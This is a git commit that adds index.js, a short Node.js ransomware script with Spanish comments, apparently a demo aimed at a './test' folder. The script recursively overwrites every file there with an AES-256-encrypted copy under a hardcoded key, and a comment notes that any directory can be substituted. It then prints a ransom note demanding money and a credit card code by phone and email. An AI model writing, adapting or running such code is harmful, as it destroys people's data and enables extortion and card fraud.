cab5d4b0424a75b5d87612d658424fcbfec07228
K1nsuryo <83989032+kinsuryo@users.noreply.github.com>
2022-01-13 02:32:43 -0300

    Create index.js

---
+++ index.js
@@ -0,0 +1,28 @@
+fs = require('fs'), crypto = require('crypto');
+crypto = require('crypto'), recursive = require("recursive-readdir");
+
+// Evitar el cierre automático
+process.stdin.resume();
+
+// Cifrar
+encrypt = (text, secret) => {
+      const cipher = crypto.createCipher('aes256', secret)
+      let crypted = cipher.update(text, 'utf8', 'hex')
+      crypted += cipher.final('hex')
+      return crypted
+}
+
+// Generar una contraseña
+const password = JSON.stringify(crypto.createHash('sha256').update('very weak password').digest('hex'));
+
+// Leer archivos
+// Puede cambiar './test' a cualquier otro directorio
+recursive("./test", ['index.js', 'index.exe', 'decrypt.js', 'decrypt.exe'] , (err, files) => {
+  for(let i of files){
+    fs.writeFileSync(i, encrypt(fs.readFileSync(i, 'utf8'), password));
+}});
+console.log(`
+¡UPS! Parece que todos tus archivos han sido encriptados :(
+
+  Podemos ayudarte dándote una clave secreta. Simplemente envíe algo de dinero al 88005553535 y escriba un correo electrónico a lolkekcheburek@superpuperpochta.com con el código de su tarjeta de crédito.`
+  );
